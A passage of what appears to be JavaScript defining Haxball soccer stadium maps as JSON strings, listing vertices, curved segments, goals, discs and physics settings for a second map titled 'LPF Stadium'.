155, "v1" : 156, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 157, "v1" : 158, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 159, "v1" : 160, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 161, "v1" : 162, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 163, "v1" : 164, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 165, "v1" : 166, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 167, "v1" : 168, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 169, "v1" : 170, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 171, "v1" : 172, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 30.5 }, { "v0" : 173, "v1" : 174, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 30.5 }, { "v0" : 175, "v1" : 176, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 39.181884674082816 }, { "v0" : 177, "v1" : 178, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 33.147490369972004 }, { "v0" : 179, "v1" : 180, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 30.86073135771021 }, { "v0" : 181, "v1" : 182, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 35.19051396221234 }, { "v0" : 183, "v1" : 184, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 33.147490369972004 }, { "v0" : 185, "v1" : 186, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 23.18828044702916 }, { "v0" : 187, "v1" : 188, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 74.35999658908567 }, { "v0" : 189, "v1" : 190, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 16.4540974994641 }, { "v0" : 191, "v1" : 192, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 16.908293850310912 }, { "v0" : 193, "v1" : 194, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : -0.8470831489067162 }, { "v0" : 195, "v1" : 196, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : -18.2525990617023 }, { "v0" : 197, "v1" : 198, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 23.18828044702916 }, { "v0" : 199, "v1" : 200, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 3.434732992799685 }, { "v0" : 201, "v1" : 202, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 203, "v1" : 204, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 205, "v1" : 206, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 207, "v1" : 208, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 209, "v1" : 210, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 211, "v1" : 212, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 213, "v1" : 214, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 215, "v1" : 216, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 217, "v1" : 218, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 219, "v1" : 220, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 95, "v1" : 182, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 95, "v1" : 180, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 5.1503946672979835 }, { "v0" : 95, "v1" : 180, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 50 }, { "v0" : 75, "v1" : 186, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : -63.384007741436164 }, { "v0" : 75, "v1" : 190, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : -58.93414564563431 }, { "v0" : 75, "v1" : 77, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : -63.67867690950191 }, { "v0" : 190, "v1" : 202, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 30.35408736274531 }, { "v0" : 190, "v1" : 204, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 38.71906519735212 }, { "v0" : 190, "v1" : 206, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 40.1697553109201 }, { "v0" : 190, "v1" : 208, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 190, "v1" : 210, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 190, "v1" : 212, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 58.83648077641912 }, { "v0" : 190, "v1" : 214, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 190, "v1" : 216, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" }, { "v0" : 190, "v1" : 218, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : 66.76949146697507 }, { "v0" : 190, "v1" : 220, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8", "curve" : -15.362643708078915 }, { "v0" : 186, "v1" : 76, "bCoef" : 0.1, "cMask" : [ ], "color" : "B6B6B8" } ], "planes" : [ { "normal" : [0,1 ], "dist" : -350, "bCoef" : 0.1 }, { "normal" : [-1,0 ], "dist" : -770, "bCoef" : 0.1, "_selected" : true }, { "normal" : [0,-1 ], "dist" : -320, "cMask" : ["ball" ] }, { "normal" : [0,-1 ], "dist" : -350, "bCoef" : 0.1 }, { "normal" : [1,0 ], "dist" : -770, "bCoef" : 0.1 }, { "normal" : [0,1 ], "dist" : -320, "cMask" : ["ball" ] } ], "goals" : [ { "p0" : [-706.25,-85 ], "p1" : [-706.25,85 ], "team" : "red" }, { "p0" : [706.25,-85 ], "p1" : [706.25,85 ], "team" : "blue" } ], "discs" : [ { "pos" : [0,0 ], "radius" : 6.25, "bCoef" : 0.4, "invMass" : 1.5, "cGroup" : ["ball","kick","score" ], "color" : "FFCC00" }, { "pos" : [-700,-85 ], "radius" : 5.5, "invMass" : 0, "color" : "FF0000" }, { "pos" : [-700,85 ], "radius" : 5.5, "invMass" : 0, "color" : "FF0000" }, { "pos" : [700,-85 ], "radius" : 5.5, "invMass" : 0, "color" : "0022FD" }, { "pos" : [700,85 ], "radius" : 5.5, "invMass" : 0, "color" : "0022FD" }, { "pos" : [-700,320 ], "radius" : 3, "bCoef" : 0.1, "invMass" : 0, "color" : "FFCC00", "cMask" : [ ] }, { "pos" : [-700,-320 ], "radius" : 3, "bCoef" : 0.1, "invMass" : 0, "color" : "FFCC00", "cMask" : [ ] }, { "pos" : [700,-320 ], "radius" : 3, "bCoef" : 0.1, "invMass" : 0, "color" : "FFCC00", "cMask" : [ ] }, { "pos" : [700,320 ], "radius" : 3, "bCoef" : 0.1, "invMass" : 0, "color" : "FFCC00", "cMask" : [ ] } ], "playerPhysics" : { "bCoef" : 0.1, "acceleration" : 0.11, "kickingAcceleration" : 0.083 }, "ballPhysics" : "disc0", "traits" : { } }';

var mapa4vs4Gris = '{ "name" : "✨「 𝗟𝗣𝗙 𝗦𝘁𝗮𝗱𝗶𝘂𝗺 🇵🇪 」✨", "width" : 900, "height" : 380, "redSpawnPoints" : [ [ -150, -100 ], [ -150, 100 ], [ -380, 0 ], [ -600, 0 ], [ -770, 0 ] ], "blueSpawnPoints" : [ [ 150, 100 ], [ 150, -100 ], [ 380, 0 ], [ 600, 0 ], [ 770, 0 ] ], "bg" : { "type" : "hockey" }, "vertexes" : [ /* 0 */ { "x" : -700, "y" : -85, "cMask" : [ ], "color" : "F5072F" }, /* 1 */ { "x" : -700, "y" : 85, "cMask" : [ ], "color" : "F5072F" }, /* 2 */ { "x" : -710, "y" : -85, "cMask" : [ ], "color" : "F5072F" }, /* 3 */ { "x" : -730, "y" : 65, "cMask" : [ ] }, /* 4 */ { "x" : -730, "y" : -65, "cMask" : [ ] }, /* 5 */ { "x" : -710, "y" : 85, "cMask" : [ ], "color" : "F5072F" }, /* 6 */ { "x" : 700, "y" : -85, "cMask" : [ ], "color" : "F5072F" }, /* 7 */ { "x" : 700, "y" : 85, "cMask" : [ ], "color" : "F5072F" }, /* 8 */ { "x" : 710, "y" : -85, "cMask" : [ ], "color" : "F5072F" }, /* 9 */ { "x" : 730, "y" : 65, "cMask" : [ ] }, /* 10 */ { "x" : 730, "y" : -65, "cMask" : [ ] }, /* 11 */ { "x" : 710, "y" : 85, "cMask" : [ ], "color" : "F5072F" }, /* 12 */ { "x" : -700, "y" : -285, "cMask" : [ ], "color" : "B6B6B8" }, /* 13 */ { "x" : -700, "y" : 285, "cMask" : [ ], "color" : "B6B6B8" }, /* 14 */ { "x" : 700, "y" : 285, "cMask" : [ ], "color" : "B6B6B8" }, /* 15 */ { "x" : 700, "y" : -285, "cMask" : [ ], "color" : "B6B6B8" }, /* 16 */ { "x" : 0, "y" : -320, "cMask" : [ ], "color" : "B6B6B8" }, /* 17 */ { "x" : 0, "y" : -100, "cMask" : [ ], "color" : "B6B6B8" }, /* 18 */ { "x" : 0, "y" : -350, "cMask" : [ ] }, /* 19 */ { "x" : 0, "y" : 100, "cMask" : [ ], "color" : "B6B6B8" }, /* 20 */ { "x" : -700, "y" : -320, "cMask" : [ ] }, /* 21 */ { "x" : 700, "y" : -320, "cMask" : [ ] }, /* 22 */ { "x" : -700, "y" : 320, "cMask" : [ ] }, /* 23 */ { "x" : 0, "y" : 320, "cMask" : [ ], "color" : "B6B6B8" }, /* 24 */ { "x" : 0, "y" : 350, "cMask" : [ ] }, /* 25 */ { "x" : 700, "y" : 320, "cMask" : [ ] }, /* 26 */ { "x" : -450, "y" : -342, "cMask" : [ ] }, /* 27 */ { "x" : -450, "y" : -297, "cMask" : [ ] }, /* 28 */ { "x" : -350, "y" : -342, "cMask" : [ ] }, /* 29 */ { "x" : -350, "y" : -297, "cMask" : [ ] }, /* 30 */ { "x" : -250, "y" : -342, "cMask" : [ ] }, /* 31 */ { "x" : -250, "y" : -297, "cMask" : [ ] }, /* 32 */ { "x" : 250, "y" : -342, "cMask" : [ ] }, /* 33 */ { "x" : 250, "y" : -297, "cMask" : [ ] }, /* 34 */ { "x" : 350, "y" : -342, "cMask" : [ ] }, /* 35 */ { "x" : 350, "y" : -297, "cMask" : [ ] }, /* 36 */ { "x" : 450, "y" : -342, "cMask" : [ ] }, /* 37 */ { "x" : 450, "y" : -297, "cMask" : [ ] }, /* 38 */ { "x" : -450, "y" : 298, "cMask" : [ ] }, /* 39 */ { "x" : -450, "y" : 345, "cMask" : [ ] }, /* 40 */ { "x" : -350, "y" : 298, "cMask" : [ ] }, /* 41 */ { "x" : -350, "y" : 345, "cMask" : [ ] }, /* 42 */ { "x" : -250, "y" : 298, "cMask" : [ ] }, /* 43 */ { "x" : -250, "y" : 345, "cMask" : [ ] }, /* 44 */ { "x" : 250, "y" : 298, "cMask" : [ ] }, /* 45 */ { "x" : 250, "y" : 345, "cMask" : [ ] }, /* 46 */ { "x" : 350, "y" : 298, "cMask" : [ ] }, /* 47 */ { "x" : 350, "y" : 345, "cMask" : [ ] }, /* 48 */ { "x" : 450, "y" : 298, "cMask" : [ ] }, /* 49 */ { "x" : 450, "y" : 345, "cMask" : [ ] }, /* 50 */ { "x" : -730, "y" : -160, "cMask" : [ ] }, /* 51 */ { "x" : -675, "y" : -160, "cMask" : [ ] }, /* 52 */ { "x" : -730, "y" : 160, "cMask" : [ ] }, /* 53 */ { "x" : -675, "y" : 160, "cMask" : [ ] }, /* 54 */ { "x" : 675, "y" : -160, "cMask" : [ ] }, /* 55 */ { "x" : 730, "y" : -160, "cMask" : [ ] }, /* 56 */ { "x" : 675, "y" : 160, "cMask" : [ ] }, /* 57 */ { "x" : 730, "y" : 160, "cMask" : [ ] }, /* 58 */ { "x" : -76.70789660935554, "y" : 38.34883878849523, "cMask" : [ ], "color" : "B6B6B8" }, /* 59 */ { "x" : -76.70789660935554, "y" : 31.08816078141045, "cMask" : [ ], "color" : "B6B6B8" }, /* 60 */ { "x" : -62.18654059518597, "y" : 23.827482774325667, "cMask" : [ ], "color" : "B6B6B8" }, /* 61 */ { "x" : -33.14382856684685, "y" : 23.827482774325667, "cMask" : [ ], "color" : "B6B6B8" }, /* 62 */ { "x" : -33.14382856684685, "y" : 38.34883878849523, "cMask" : [ ], "color" : "B6B6B8" }, /* 63 */ { "x" : -76.70789660935554, "y" : 12.936465763698493, "cMask" : [ ], "curve" : 35, "color" : "B6B6B8" }, /* 64 */ { "x" : -76.70789660935554, "y" : -41.51861928943738, "cMask" : [ ], "color" : "B6B6B8" }, /* 65 */ { "x" : -62.18654059518597, "y" : -41.51861928943738, "cMask" : [ ], "color" : "B6B6B8" }, /* 66 */ { "x" : -62.18654059518597, "y" : -3.763093652596507, "cMask" : [ ], "curve" : 40, "color" : "B6B6B8" }, /* 67 */ { "x" : -22.252811556219672, "y" : 38.34883878849523, "cMask" : [ ], "color" : "B6B6B8" }, /* 68 */ { "x" : -22.252811556219672, "y" : 8.580058959447626, "cMask" : [ ], "color" : "B6B6B8" }, /* 69 */ { "x" : -7.731455542050106, "y" : 4.2236521551967545, "cMask" : [ ], "color" : "B6B6B8" }, /* 70 */ { "x" : -7.731455542050106, "y" : 38.34883878849523, "cMask" : [ ], "color" : "B6B6B8" }, /* 71 */ { "x" : 2.43349366786859, "y" : 2.0454487530713177, "cMask" : [ ], "color" : "B6B6B8" }, /* 72 */ { "x" : 5.337764870702504, "y" : 2.0454487530713177, "cMask" : [ ], "color" : "B6B6B8" }, /* 73 */ { "x" : -22.252811556219672, "y" : -3.763093652596507, "cMask" : [ ], "color" : "B6B6B8" }, /* 74 */ { "x" : -22.252811556219672, "y" : -41.51861928943738, "cMask" : [ ], "color" : "B6B6B8" }, /* 75 */ { "x" : 5.337764870702504, "y" : -41.51861928943738, "cMask" : [ ], "color" : "B6B6B8" }, /* 76 */ { "x" : 21.31125648628903, "y" : -23.36692427172542, "cMask" : [ ], "color" : "B6B6B8" }, /* 77 */ { "x" : 21.31125648628903, "y" : -8.845568257555856, "cMask" : [ ], "color" : "B6B6B8" }, /* 78 */ { "x" : 3.1595614685770688, "y" : -12.475907261098248, "cMask" : [ ], "color" : "B6B6B8" }, /* 79 */ { "x" : -7.731455542050106, "y" : -6.66736485543042, "cMask" : [ ], "color" : "B6B6B8" }, /* 80 */ { "x" : -7.731455542050106, "y" : -26.997263275267812, "cMask" : [ ], "color" : "B6B6B8" }, /* 81 */ { "x" : 3.1595614685770688, "y" : -26.997263275267812, "cMask" : [ ], "color" : "B6B6B8" }, /* 82 */ { "x" : 32.202273496916206, "y" : 38.34883878849523, "cMask" : [ ], "color" : "B6B6B8" }, /* 83 */ { "x" : 32.202273496916206, "y" : -2.3109580511795498, "cMask" : [ ], "color" : "B6B6B8" }, /* 84 */ { "x" : 46.72362951108576, "y" : -3.763093652596507, "cMask" : [ ], "color" : "B6B6B8" }, /* 85 */ { "x" : 68.50566353234011, "y" : -3.763093652596507, "cMask" : [ ], "color" : "B6B6B8" }, /* 86 */ { "x" : 68.50566353234011, "y" : 2.0454487530713177, "cMask" : [ ], "color" : "B6B6B8" }, /* 87 */ { "x" : 46.72362951108576, "y" : 2.0454487530713177, "cMask" : [ ], "color" : "B6B6B8" }, /* 88 */ { "x" : 46.72362951108576, "y" : 38.34883878849523, "cMask" : [ ], "color" : "B6B6B8" }, /* 89 */ { "x" : 32.202273496916206, "y" : -8.845568257555856, "cMask" : [ ], "color" : "B6B6B8" }, /* 90 */ { "x" : 32.202273496916206, "y" : -41.51861928943738, "cMask" : [ ], "color" : "B6B6B8" }, /* 91 */ { "x" : 75.7663415394249, "y" : -41.51861928943738, "cMask" : [ ], "color" : "B6B6B8" }, /* 92 */ { "x" : 75.7663415394249, "y" : -26.997263275267812, "cMask" : [ ], "color" : "B6B6B8" }, /* 93 */ { "x" : 46.72362951108576, "y" : -26.997263275267812, "cMask" : [ ], "color" : "B6B6B8" }, /* 94 */ { "x" : 46.72362951108576, "y" : -12.475907261098248, "cMask" : [ ], "color" : "B6B6B8" }, /* 95 */ { "x" : 68.50566353234011, "y" : -12.475907261098248, "cMask" : [ ], "color" : "B6B6B8" }, /* 96 */ { "x" : 83.02701954650968, "y" : -3.037025851888029, "cMask" : [ ], "color" : "B6B6B8" }, /* 97 */ { "x" : -75.25576100793857, "y" : -40.7925514887289, "cMask" : [ ], "color" : "B6B6B8" }, /* 98 */ { "x" : -75.25576100793857, "y" : 12.210397962990013, "cMask" : [ ], "color" : "B6B6B8" }, /* 99 */ { "x" : -73.80362540652163, "y" : -40.7925514887289, "cMask" : [ ], "color" : "B6B6B8" }, /* 100 */ { "x" : -73.80362540652163, "y" : 10.758262361573058, "cMask" : [ ], "color" : "B6B6B8" }, /* 101 */ { "x" : -72.35148980510466, "y" : -40.7925514887289, "cMask" : [ ], "color" : "B6B6B8" }, /* 102 */ { "x" : -72.35148980510466, "y" : 10.032194560864578, "cMask" : [ ], "color" : "B6B6B8" }, /* 103 */ { "x" : -70.89935420368772, "y" : -40.7925514887289, "cMask" : [ ], "color" : "B6B6B8" }, /* 104 */ { "x" : -70.89935420368772, "y" : 10.032194560864578, "cMask" : [ ], "color" : "B6B6B8" }, /* 105 */ { "x" : -69.44721860227077, "y" : -40.7925514887289, "cMask" : [ ], "color" : "B6B6B8" }, /* 106 */ { "x" : -69.44721860227077, "y" : 9.3061267601561, "cMask" : [ ], "color" : "B6B6B8" }, /* 107 */ { "x" : -67.99508300085381, "y" : -40.7925514887289, "cMask" : [ ], "color" : "B6B6B8" }, /* 108 */ { "x" : -67.99508300085381, "y" : 8.580058959447626, "cMask" : [ ], "color" : "B6B6B8" }, /* 109 */ { "x" : -66.54294739943684, "y" : -40.7925514887289, "cMask" : [ ], "color" : "B6B6B8" }, /* 110 */ { "x" : -66.54294739943684, "y" : 7.853991158739145, "cMask" : [ ], "color" : "B6B6B8" }, /* 111 */ { "x" : -65.0908117980199, "y" : -40.7925514887289, "cMask" : [ ], "color" : "B6B6B8" }, /* 112 */ { "x" : -65.0908117980199, "y" : 7.853991158739145, "cMask" : [ ], "color" : "B6B6B8" }, /* 113 */ { "x" : -63.63867619660293, "y" : -40.7925514887289, "cMask" : [ ], "color" : "B6B6B8" }, /* 114 */ { "x" : -63.63867619660293, "y" : 7.127923358030666, "cMask" : [ ], "color" : "B6B6B8" }, /* 115 */ { "x" : -20.800675954802713, "y" : -40.7925514887289, "cMask" : [ ], "color" : "B6B6B8" }, /* 116 */ { "x" : -20.800675954802713, "y" : -3.763093652596507, "cMask" : [ ], "color" : "B6B6B8" }, /* 117 */ { "x" : -19.348540353385754, "y" : -40.7925514887289, "cMask" : [ ], "color" : "B6B6B8" }, /* 118 */ { "x" : -19.348540353385754, "y" : -4.489161453304986, "cMask" : [ ], "color" : "B6B6B8" }, /* 119 */ { "x" : -17.8964047519688, "y" : -40.7925514887289, "cMask" : [ ], "color" : "B6B6B8" }, /* 120 */ { "x" : -17.8964047519688, "y" : -4.489161453304986, "cMask" : [ ], "color" : "B6B6B8" }, /* 121 */ { "x" : -16.444269150551847, "y" : -40.7925514887289, "cMask" : [ ], "color" : "B6B6B8" }, /* 122 */ { "x" : -16.444269150551847, "y" : -5.578263154367702, "cMask" : [ ], "color" : "B6B6B8" }, /* 123 */ { "x" : -15.718201349843367, "y" : -40.7925514887289, "cMask" : [ ], "color" : "B6B6B8" }, /* 124 */ { "x" : -15.718201349843367, "y" : -5.578263154367702, "cMask" : [ ], "color" : "B6B6B8" }, /* 125 */ { "x" : -14.26606574842641, "y" : -40.7925514887289, "cMask" : [ ], "color" : "B6B6B8" }, /* 126 */ { "x" : -14.26606574842641, "y" : -5.941297054721942, "cMask" : [ ], "color" : "B6B6B8" }, /* 127 */ { "x" : -12.813930147009453, "y" : -40.7925514887289, "cMask" : [ ], "color" : "B6B6B8" }, /* 128 */ { "x" : -12.813930147009453, "y" : -5.941297054721942, "cMask" : [ ], "color" : "B6B6B8" }, /* 129 */ { "x" : -11.361794545592499, "y" : -40.7925514887289, "cMask" : [ ], "color" : "B6B6B8" }, /* 130 */ { "x" : -11.361794545592499, "y" : -6.30433095507618, "cMask" : [ ], "color" : "B6B6B8" }, /* 131 */ { "x" : -9.909658944175538, "y" : -40.7925514887289, "cMask" : [ ], "color" : "B6B6B8" }, /* 132 */ { "x" : -9.909658944175538, "y" : -6.30433095507618, "cMask" : [ ], "color" : "B6B6B8" }, /* 133 */ { "x" : -8.457523342758584, "y" : -40.7925514887289, "cMask" : [ ], "color" : "B6B6B8" }, /* 134 */ { "x" : -8.457523342758584, "y" : -6.66736485543042, "cMask" : [ ], "color" : "B6B6B8" }, /* 135 */ { "x" : 32.92834129762468, "y" : -40.06648368802042, "cMask" : [ ], "color" : "B6B6B8" }, /* 136 */ { "x" : 75.04027373871641, "y" : -40.06648368802042, "cMask" : [ ], "color" : "B6B6B8" }, /* 137 */ { "x" : 32.92834129762468, "y" : -38.614348086603464, "cMask" : [ ], "color" : "B6B6B8" }, /* 138 */ { "x" : 75.04027373871641, "y" : -38.614348086603464, "cMask" : [ ], "color" : "B6B6B8" }, /* 139 */ { "x" : 32.92834129762468, "y" : -37.1622124851865, "cMask" : [ ], "color" : "B6B6B8" }, /* 140 */ { "x" : 75.04027373871641, "y" : -37.1622124851865, "cMask" : [ ], "color" : "B6B6B8" }, /* 141 */ { "x" : 32.92834129762468, "y" : -35.71007688376955, "cMask" : [ ], "color" : "B6B6B8" }, /* 142 */ { "x" : 75.04027373871641, "y" : -35.71007688376955, "cMask" : [ ], "color" : "B6B6B8" }, /* 143 */ { "x" : 32.92834129762468, "y" : -34.2579412823526, "cMask" : [ ], "color" : "B6B6B8" }, /* 144 */ { "x" : 75.04027373871641, "y" : -34.2579412823526, "cMask" : [ ], "color" : "B6B6B8" }, /* 145 */ { "x" : 32.92834129762468, "y" : -32.805805680935634, "cMask" : [ ], "color" : "B6B6B8" }, /* 146 */ { "x" : 75.04027373871641, "y" : -32.805805680935634, "cMask" : [ ], "color" : "B6B6B8" }, /* 147 */ { "x" : 32.92834129762468, "y" : -31.35367007951868, "cMask" : [ ], "color" : "B6B6B8" }, /* 148 */ { "x" : 75.04027373871641, "y" : -31.35367007951868, "cMask" : [ ], "color" : "B6B6B8" }, /* 149 */ { "x" : 32.92834129762468, "y" : -29.901534478101727, "cMask" : [ ], "color" : "B6B6B8" }, /* 150 */ { "x" : 75.04027373871641, "y" : -29.901534478101727, "cMask" : [ ], "color" : "B6B6B8" }, /* 151 */ { "x" : 32.92834129762468, "y" : -28.449398876684764, "cMask" : [ ], "color" : "B6B6B8" }, /* 152 */ { "x" : 75.04027373871641, "y" : -28.449398876684764, "cMask" : [ ], "color" : "B6B6B8" }, /* 153 */ { "x" : 33.654409098333154, "y" : -30.627602278810205, "cMask" : [ ], "color" : "B6B6B8" }, /* 154 */ { "x" : 33.654409098333154, "y" : -10.297703858972811, "cMask" : [ ], "color" : "B6B6B8" }, /* 155 */ { "x" : 35.10654469975011, "y" : -30.627602278810205, "cMask" : [ ], "color" : "B6B6B8" }, /* 156 */ { "x" : 35.10654469975011, "y" : -10.297703858972811, "cMask" : [ ], "color" : "B6B6B8" }, /* 157 */ { "x" : 36.558680301167065, "y" : -30.627602278810205, "cMask" : [ ], "color" : "B6B6B8" }, /* 158 */ { "x" : 36.558680301167065, "y" : -10.297703858972811, "cMask" : [ ], "color" : "B6B6B8" }, /* 159 */ { "x" : 38.01081590258403, "y" : -30.627602278810205, "cMask" : [ ], "color" : "B6B6B8" }, /* 160 */ { "x" : 38.01081590258403, "y" : -10.297703858972811, "cMask" : [ ], "color" : "B6B6B8" }, /* 161 */ { "x" : 39.46295150400098, "y" : -30.627602278810205, "cMask" : [ ], "color" : "B6B6B8" }, /* 162 */ { "x" : 39.46295150400098, "y" : -10.297703858972811, "cMask" : [ ], "color" : "B6B6B8" }, /* 163 */ { "x" : 40.91508710541794, "y" : -30.627602278810205, "cMask" : [ ], "color" : "B6B6B8" }, /* 164 */ { "x" : 40.91508710541794, "y" : -10.297703858972811, "cMask" : [ ], "color" : "B6B6B8" }, /* 165 */ { "x" : 42.367222706834895, "y" : -30.627602278810205, "cMask" : [ ], "color" : "B6B6B8" }, /* 166 */ { "x" : 42.367222706834895, "y" : -10.297703858972811, "cMask" : [ ], "color" : "B6B6B8" }, /* 167 */ { "x" : 43.81935830825186, "y" : -30.627602278810205, "cMask" : [ ], "color" : "B6B6B8" }, /* 168 */ { "x" : 43.81935830825186, "y" : -10.297703858972811, "cMask" : [ ], "color" : "B6B6B8" }, /* 169 */ { "x" : 45.271493909668806, "y" : -30.627602278810205, "cMask" : [ ], "color" : "B6B6B8" }, /* 170 */ { "x" : 45.271493909668806, "y" : -10.297703858972811, "cMask" : [ ], "color" : "B6B6B8" }, /* 171 */ { "x" : -63.63867619660293, "y" : -3.763093652596507, "cMask" : [ ], "curve" : 30.5, "color" : "B6B6B8" }, /* 172 */ { "x" : 68.31204840652863, "y" : -6.231719743439167, "cMask" : [ ], "curve" : 30.5, "color" : "B6B6B8" }, /* 173 */ { "x" : -63.10622352170594, "y" : -1.5848902504710713, "cMask" : [ ], "color" : "B6B6B8" }, /* 174 */ { "x" : 55.24282799377601, "y" : -9.135990946273079, "cMask" : [ ], "color" : "B6B6B8" }, /* 175 */ { "x" : -68.18869812666527, "y" : 1.755026064354094, "cMask" : [ ], "color" : "B6B6B8" }, /* 176 */ { "x" : 45.07787878385732, "y" : -10.588126547690036, "cMask" : [ ], "color" : "B6B6B8" }, /* 177 */ { "x" : -64.5583591231229, "y" : 1.755026064354094, "cMask" : [ ], "color" : "B6B6B8" }, /* 178 */ { "x" : 55.9688957944845, "y" : -9.862058746981559, "cMask" : [ ], "color" : "B6B6B8" }, /* 179 */ { "x" : -63.0993102784863, "y" : 2.252901444237491, "cMask" : [ ], "color" : "B6B6B8" }, /* 180 */ { "x" : 51.61940223345327, "y" : -9.36418336709816, "cMask" : [ ], "color" : "B6B6B8" }, /* 181 */ { "x" : -66.72964928202869, "y" : 4.431104846362928, "cMask" : [ ], "color" : "B6B6B8" }, /* 182 */ { "x" : 64.68862264620587, "y" : -8.638115566389683, "cMask" : [ ], "color" : "B6B6B8" }, /* 183 */ { "x" : -63.0993102784863, "y" : 5.1571726470714045, "cMask" : [ ], "color" : "B6B6B8" }, /* 184 */ { "x" : 47.2629954292024, "y" : -7.912047765681205, "cMask" : [ ], "color" : "B6B6B8" }, /* 185 */ { "x" : -65.27751368061175, "y" : 8.061443849905318, "cMask" : [ ], "color" : "B6B6B8" }, /* 186 */ { "x" : 17.494215600154785, "y" : -9.36418336709816, "cMask" : [ ], "color" : "B6B6B8" }, /* 187 */ { "x" : -63.99134023212772, "y" : 3.207161665771051, "cMask" : [ ], "color" : "B6B6B8" }, /* 188 */ { "x" : -38.57896720733098, "y" : -6.231719743439167, "cMask" : [ ], "color" : "B6B6B8" }, /* 189 */ { "x" : -64.71740803283619, "y" : 3.9332294664795304, "cMask" : [ ], "color" : "B6B6B8" }, /* 190 */ { "x" : 15.150050045096414, "y" : -10.588126547690036, "cMask" : [ ], "color" : "B6B6B8" }, /* 191 */ { "x" : -62.53920463071076, "y" : -1.8753129391882983, "cMask" : [ ], "color" : "B6B6B8" }, /* 192 */ { "x" : -38.57896720733098, "y" : -7.6838553448561235, "cMask" : [ ], "color" : "B6B6B8" }, /* 193 */ { "x" : -62.53920463071076, "y" : 4.659297267188007, "cMask" : [ ], "color" : "B6B6B8" }, /* 194 */ { "x" : -15.344797584659672, "y" : -9.135990946273079, "cMask" : [ ], "color" : "B6B6B8" }, /* 195 */ { "x" : -66.66743009305196, "y" : 0.3028904629371376, "cMask" : [ ], "color" : "B6B6B8" }, /* 196 */ { "x" : -47.06359947392305, "y" : -0.4231773377713408, "cMask" : [ ], "color" : "B6B6B8" }, /* 197 */ { "x" : -62.41472193709564, "y" : -2.1657467068209377, "cMask" : [ ], "color" : "B6B6B8" }, /* 198 */ { "x" : -49.345501524343035, "y" : -1.4396789061124604, "cMask" : [ ], "color" : "B6B6B8" }, /* 199 */ { "x" : -9.909658944175538, "y" : -7.6838553448561235, "cMask" : [ ], "color" : "B6B6B8" }, /* 200 */ { "x" : 22.76339208770598, "y" : -9.135990946273079, "cMask" : [ ], "color" : "B6B6B8" }, /* 201 */ { "x" : -9.183591143467062, "y" : -40.7925514887289, "cMask" : [ ], "color" : "B6B6B8" }, /* 202 */ { "x" : 8.242036073536417, "y" : -40.7925514887289, "cMask" : [ ], "color" : "B6B6B8" }, /* 203 */ { "x" : -9.183591143467062, "y" : -39.34041588731194, "cMask" : [ ], "color" : "B6B6B8" }, /* 204 */ { "x" : 11.872375077078807, "y" : -39.34041588731194, "cMask" : [ ], "color" : "B6B6B8" }, /* 205 */ { "x" : -9.183591143467062, "y" : -37.888280285894986, "cMask" : [ ], "color" : "B6B6B8" }, /* 206 */ { "x" : 14.776646279912718, "y" : -37.888280285894986, "cMask" : [ ], 